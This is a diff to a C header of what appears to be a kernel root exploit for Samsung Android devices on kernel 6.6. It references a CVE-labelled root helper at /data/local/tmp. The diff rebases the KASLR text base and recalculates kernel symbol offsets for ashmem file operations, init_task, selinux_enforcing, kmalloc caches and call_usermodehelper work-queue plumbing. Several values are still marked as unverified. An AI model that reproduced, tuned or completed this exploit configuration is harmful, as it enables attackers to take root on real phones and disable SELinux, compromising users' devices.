@@ -39,7 +39,7 @@
 /* ------------------------------------------------------------------ */
 /* KASLR / memory-map constants (from f1q-S931BXXSAAZI1, kernel 6.6)  */
 /* ------------------------------------------------------------------ */
-#define KIMAGE_TEXT_BASE        0xffffffc008000000ULL
+#define KIMAGE_TEXT_BASE        0xffffffc080000000ULL
 #define P0_PAGE_OFFSET          0xffffff8000000000ULL
 #define P0_PHYS_OFFSET          0x80000000ULL
 #define P0_KERNEL_PHYS_LOAD     0x80080000ULL
@@ -68,7 +68,7 @@
  * Then uncomment APP_TRACEFS_KASLR_DIRECT.
  */
 #define SLIDE_TRACEFS_EVENT_ID          106   /* TODO: verify for S936U1UEUCZZHL */
-#define SLIDE_TRACEFS_WORKER_CALLER_OFF 0x780d98e4ULL  /* TODO: verify */
+#define SLIDE_TRACEFS_WORKER_CALLER_OFF 0xd98e4ULL  /* TODO: verify */
 /* #define APP_TRACEFS_KASLR_DIRECT        1 */
 
 #define SLIDE_PSELECT_WORD_SHIFT    3
@@ -127,22 +127,22 @@
 /* Placeholders from f1q-S931BXXSAAZI1 (same SoC, same kernel 6.6.127)*/
 /* ------------------------------------------------------------------ */
 #define ASHMEM_MISC_FOPS_OFF            0x023bb5b0ULL  /* TODO */
-#define ASHMEM_FOPS_OFF                 0x792f9188ULL  /* TODO */
-#define ASHMEM_IOCTL_OFF                0x78c907f4ULL  /* TODO */
+#define ASHMEM_FOPS_OFF                 0x12f9188ULL  /* TODO */
+#define ASHMEM_IOCTL_OFF                0xc907f4ULL  /* TODO */
 #define ASHMEM_COMPAT_IOCTL_OFF         0x00d3ac4cULL  /* TODO */
-#define ASHMEM_MMAP_OFF                 0x78c90f04ULL  /* TODO */
-#define ASHMEM_OPEN_OFF                 0x78c91124ULL  /* TODO */
-#define ASHMEM_RELEASE_OFF              0x78c911acULL  /* TODO */
-#define ASHMEM_SHOW_FDINFO_OFF          0x78c91238ULL  /* TODO */
-#define CONFIGFS_READ_ITER_OFF          0x78491b28ULL  /* TODO */
-#define CONFIGFS_BIN_WRITE_ITER_OFF     0x78492054ULL  /* TODO */
-#define COPY_SPLICE_READ_OFF            0x784154a8ULL  /* TODO */
-#define NOOP_LLSEEK_OFF                 0x783c81e0ULL  /* TODO */
-#define INIT_TASK_OFF                   0x7a13e080ULL  /* TODO */
-#define ROOT_TASK_GROUP_OFF             0x7a338780ULL  /* TODO */
+#define ASHMEM_MMAP_OFF                 0xc90f04ULL  /* TODO */
+#define ASHMEM_OPEN_OFF                 0xc91124ULL  /* TODO */
+#define ASHMEM_RELEASE_OFF              0xc911acULL  /* TODO */
+#define ASHMEM_SHOW_FDINFO_OFF          0xc91238ULL  /* TODO */
+#define CONFIGFS_READ_ITER_OFF          0x491b28ULL  /* TODO */
+#define CONFIGFS_BIN_WRITE_ITER_OFF     0x492054ULL  /* TODO */
+#define COPY_SPLICE_READ_OFF            0x4154a8ULL  /* TODO */
+#define NOOP_LLSEEK_OFF                 0x3c81e0ULL  /* TODO */
+#define INIT_TASK_OFF                   0x213e080ULL  /* TODO */
+#define ROOT_TASK_GROUP_OFF             0x2338780ULL  /* TODO */
 #define SELINUX_ENFORCING_OFF           0x02521588ULL  /* TODO */
-#define KMALLOC_CACHES_OFF              0x79686858ULL  /* TODO */
-#define ANON_PIPE_BUF_OPS_OFF           0x79177e08ULL  /* TODO */
+#define KMALLOC_CACHES_OFF              0x1686858ULL  /* TODO */
+#define ANON_PIPE_BUF_OPS_OFF           0x1177e08ULL  /* TODO */
 
 #define ASHMEM_MISC_FOPS  (KIMAGE_TEXT_BASE + ASHMEM_MISC_FOPS_OFF)
 #define ASHMEM_FOPS       (KIMAGE_TEXT_BASE + ASHMEM_FOPS_OFF)
@@ -166,8 +166,8 @@
 /* UMH / work-queue plumbing                                           */
 /* ------------------------------------------------------------------ */
 #define ROOT_UMH_PATH "/data/local/tmp/cve-2026-43499-root"
-#define CALL_USERMODEHELPER_EXEC_WORK_OFF 0x780d1058ULL  /* TODO */
-#define SYSTEM_UNBOUND_WQ_OFF             0x7a12ac60ULL  /* TODO */
+#define CALL_USERMODEHELPER_EXEC_WORK_OFF 0xd1058ULL  /* TODO */
+#define SYSTEM_UNBOUND_WQ_OFF             0x212ac60ULL  /* TODO */
 #define CALL_USERMODEHELPER_EXEC_WORK \
   (KIMAGE_TEXT_BASE + CALL_USERMODEHELPER_EXEC_WORK_OFF)
 #define SYSTEM_UNBOUND_WQ \
@@ -178,13 +178,13 @@
 /* ------------------------------------------------------------------ */
 /* Slide / netfilter / sysctl helpers                                  */
 /* ------------------------------------------------------------------ */
-#define SLIDE_NFULNL_LOGGER_OFF         0x78e65984ULL  /* TODO */
-#define SLIDE_LOGGERS_0_1_OFF           0x7a131fa8ULL  /* TODO */
+#define SLIDE_NFULNL_LOGGER_OFF         0xe65984ULL  /* TODO */
+#define SLIDE_LOGGERS_0_1_OFF           0x2131fa8ULL  /* TODO */
 #define SLIDE_RB_PARENT_TYPE_RESTORE    1ULL
-#define SLIDE_RANDOM_BOOT_ID_DATA_OFF   0x7a39b0f0ULL  /* TODO */
+#define SLIDE_RANDOM_BOOT_ID_DATA_OFF   0x239b0f0ULL  /* TODO */
 #define SLIDE_INIT_TASK_OFF             INIT_TASK_OFF
 #define SLIDE_ROOT_TASK_GROUP_OFF       ROOT_TASK_GROUP_OFF
-#define SLIDE_SYSCTL_BOOTID_OFF         0x7a39b0f0ULL  /* TODO */
+#define SLIDE_SYSCTL_BOOTID_OFF         0x239b0f0ULL  /* TODO */
 
 #define SLIDE_NFULNL_LOGGER_IMAGE \
   (KIMAGE_TEXT_BASE + SLIDE_NFULNL_LOGGER_OFF)
